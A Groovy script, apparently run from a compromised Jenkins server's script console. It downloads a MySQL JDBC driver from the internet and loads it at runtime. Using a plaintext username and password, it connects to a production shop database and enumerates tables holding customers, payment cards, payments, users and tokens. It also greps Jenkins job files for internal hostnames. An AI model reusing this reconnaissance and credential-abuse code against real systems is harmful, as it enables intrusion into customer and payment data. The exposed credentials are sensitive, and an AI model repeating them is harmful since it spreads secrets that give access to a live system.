// MICRO-AN: Download MySQL JDBC jar + connect to PROD DB
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer()
    def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(30000)
    out.toString().take(3000) + "[ERR:" + err.toString().take(200) + "]"
}

println "=== Check internet access ==="
def intNet = run("curl -sk --max-time 5 'https://repo1.maven.org/maven2/mysql/mysql-connector-java/8.0.33/mysql-connector-java-8.0.33.jar' -o /tmp/mysql-jdbc.jar -w '%{http_code}' 2>&1")
println "Download attempt: " + intNet.take(200)

def jarSize = run("ls -la /tmp/mysql-jdbc.jar 2>/dev/null || echo 'NO FILE'")
println "JAR size: " + jarSize.take(200)

if (jarSize.contains("mysql-jdbc.jar") && !jarSize.contains("NO FILE")) {
    println "\n=== Loading JDBC JAR and connecting ==="
    def jarUrl = new File("/tmp/mysql-jdbc.jar").toURL()
    this.class.classLoader.addURL(jarUrl)
    
    try {
        Class.forName("com.mysql.cj.jdbc.Driver")
        def conn = java.sql.DriverManager.getConnection(
            "jdbc:mysql://appdb.claroshop-services.net:3306/tienda?connectTimeout=8000&socketTimeout=8000",
            "adaxxidb", "JTQ6PrkecY3y1kVN"
        )
        def stmt = conn.createStatement()
        stmt.setQueryTimeout(5)
        def rs = stmt.executeQuery("SHOW TABLES")
        def tables = []
        while (rs.next()) tables << rs.getString(1)
        println "CONNECTED! Tables: " + tables.join(", ")
        
        // Get row counts for interesting tables
        ["clientes", "pedidos", "tarjetas", "pagos", "usuarios", "tokens"].each { tbl ->
            if (tables.any { it.equalsIgnoreCase(tbl) }) {
                try {
                    def rs2 = stmt.executeQuery("SELECT COUNT(*) FROM ${tbl}")
                    if (rs2.next()) println "  ${tbl}: ${rs2.getLong(1)} rows"
                } catch(e) { println "  ${tbl}: err ${e.message?.take(50)}" }
            }
        }
        conn.close()
    } catch(e) {
        println "JDBC fail: " + e.message?.take(200)
    }
} else {
    println "\nNo internet / no JAR. Trying alternative curl approach:"
    def altTest = run("curl -sk --max-time 5 'http://google.com' -I | head -3")
    println "Google test: " + altTest.take(200)
}

println "\n=== T1 specific grep (limited scope) ==="
def t1quick = run("grep -r 'apifincadob\\|mrc-services\\|dbasears' /var/jenkins_home/jobs/ 2>/dev/null | grep -v Binary | head -15")
println "T1 quick grep in jobs/: " + t1quick.take(1500)

println "=== DONE MICRO-AN ==="
